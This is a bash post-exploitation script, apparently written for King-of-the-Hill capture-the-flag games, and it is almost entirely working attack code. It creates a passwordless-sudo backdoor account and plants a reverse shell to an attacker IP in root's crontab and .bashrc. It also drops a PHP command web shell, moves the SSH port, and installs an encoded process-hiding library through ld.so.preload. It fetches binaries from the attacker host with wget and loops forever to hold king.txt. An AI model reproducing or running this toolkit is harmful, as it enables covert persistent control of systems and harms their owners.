#!/bin/bash


## made by #blvckmetxl

# --> READ: you should change the password in the beginning of the `persist` function, default is 'hahaha1234hahaha'

nickname=
ip=
port=
revsh="/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
ssh="/etc/ssh/sshd_config"

hider="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"

function nyan() {
  # https://github.com/klange/nyancat
  
  wget http://$ip/nyancat
  chmod +x nyancat
  mv -f nyancat /usr/bin/nyancat
}

function persist() {
  # adding user with your nickname
  useradd -m $nickname -s /bin/bash
  sudo sed -i "s/$nickname:x:/$nickname:qpQzOFb2UGjtE:/g" /etc/passwd #< -- change password hash here
  echo "$nickname ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

  # backdoors ;D
  echo "* * * * * root $revsh" >> /etc/crontab
  echo $revsh >> /root/.bashrc
  echo; echo; echo "<?php system(\$_GET['cmd']); ?>" >> $RANDOM.php; echo "[+] `ls -Art | tail -n 1` IS YOUR PHP BACKDOOR!"; echo; echo
}

function ssh() {
  # changes ssh port to random number generated by $RANDOM
  
  sed -i 's/Port/#Port/g' $ssh
  echo "Port $RANDOM" >> $ssh

  echo; echo; echo "[+] NEW PORT IS `tail -n 1 $ssh | cut -d' ' -f2`!"; echo; echo
  systemctl restart sshd.service
}

function stealth() {
  # https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
  
  if grep -Fxq "/usr/lobal/lib/hider.so" /etc/ld.so.preload
  then
    :
  else
    echo "$hider" | base64 -d > tar.gz && tar -xzvf tar.gz
    mv hider.so /usr/local/lib/ && echo /usr/local/lib/hider.so >> /etc/ld.so.preload
  fi
}

function koth() {
  # repeatedly puts your name in king.txt
  
  rm chattr 2>/dev/null; rm -f $(which chattr) 2>/dev/null
  wget http://$ip/chattr && chmod 744 chattr
  
  while :
  do
    ./chattr -ai /root/king.txt
    echo "$nickname" > /root/king.txt
    ./chattr +ai /root/king.txt
  done
}

if [ "$#" -gt 0 ]
then
  case "$1" in
        a) persist; sleep 2
           ssh; sleep 2
           stealth
           nyan
           koth;;
        -a)persist; sleep 2
           ssh; sleep 2
           stealth
           nyan
           koth;;

        p) persist;;
        -p)persist;;

        n) nyan;;
        -n)nyan;;

        s) ssh;;
        -s)ssh;;
  esac
else
  # if no arguments given, just check perform stealth check and execute koth function
  stealth
  koth
fi
